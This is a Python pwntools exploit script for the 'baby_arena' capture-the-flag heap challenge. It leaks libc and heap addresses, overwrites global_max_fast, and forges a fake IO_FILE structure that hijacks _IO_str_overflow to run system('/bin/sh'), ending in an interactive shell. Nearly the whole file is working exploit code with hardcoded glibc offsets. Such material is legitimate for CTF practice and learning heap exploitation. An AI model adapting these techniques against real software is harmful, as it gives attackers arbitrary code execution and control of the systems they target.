#!/usr/bin/env python
from pwn import *
from FILE import *

context.arch = 'amd64'
#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./baby_arena')
    elf = ELF('./baby_arena')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    pass

def choice(c):
    p.sendlineafter('4.exit\n', str(c))

def create(sz, data):
    choice(1)
    p.sendlineafter('Pls Input your note size\n', str(sz))
    p.sendafter('Input your note\n', data)

def delete(idx):
    choice(2)
    p.sendlineafter('Input id:\n', str(idx))

def login(name, tp):
    choice(3)
    p.sendafter('Please input your name\n', name)
    p.sendlineafter('1.admin\n', str(tp))

# # References
# - https://blog.csdn.net/yongbaoii/article/details/121937310

# leak libc & heap
create(0x98, 0x98 * '0') # 0
create(0x98, '/bin/sh\x00'.ljust(0x98, '1')) # 1
delete(0)
create(0x98, 8 * '0' + '\n') # 0
p.recvuntil('your note is\n')
p.recvuntil(8 * '0')
unsorted_bin = u64(p.recv(6).ljust(8, '\x00'))
info('unsorted_bin = ' + hex(unsorted_bin))
libc_base = unsorted_bin - 0x3c4b78
info('libc_base = ' + hex(libc_base))
create(0x400, 0x400 * '2') # 2
create(0x400, 0x400 * '3') # 3
create(0x400, 0x400 * '4') # 4
delete(2)
delete(3)
create(0x100, 0x10 * '2' + '\n') # 2
p.recvuntil('your note is\n')
p.recvuntil(0x10 * '2')
heap_base = u64(p.recvuntil('\n')[:-1].ljust(8, '\x00')) - 0x140
info('heap_base = ' + hex(heap_base))

# forge a fake file -> hijack `_IO_str_overflow`
user_buf = 0x6020b0
system = libc_base + libc.sym['system']
IO_str_jumps = libc_base + 0x3c37a0
bin_sh_str = heap_base + 0xb0
info('bin_sh_str = ' + hex(bin_sh_str))
fake_file = IO_FILE_plus_struct()
fake_file._flags = 0
fake_file._IO_write_base = 0
fake_file._IO_write_ptr = 0x7fffffffffffffff
fake_file._IO_buf_end = (bin_sh_str - 100) / 2
fake_file.vtable = IO_str_jumps
# ```
# (gdb) p/x ((uint64_t)&_IO_list_all) - ((uint64_t)&main_arena->bins)
# $1 = 0x998
# ```
# so the target chunk size should be 0x1400=2*0xa00 (after overwrite global_max_fast, we can freed it on `&_IO_list_all`)
create(0x1400, str(fake_file)[0x10:0xe0] + p64(system) + str(fake_file)[0xe8:] + '\n') # 3

# overwrite _IO_list_all & get shell
global_max_fast = libc_base + 0x3c67f8
info('global_max_fast = ' + hex(global_max_fast))
choice(3)
p.sendlineafter('Please input your name\n', p64(0xdeadbeef) + p64(global_max_fast - 8))
delete(3)
choice(4)

#gdb.attach(p, 'b *_IO_str_overflow+129\nc')

p.interactive()

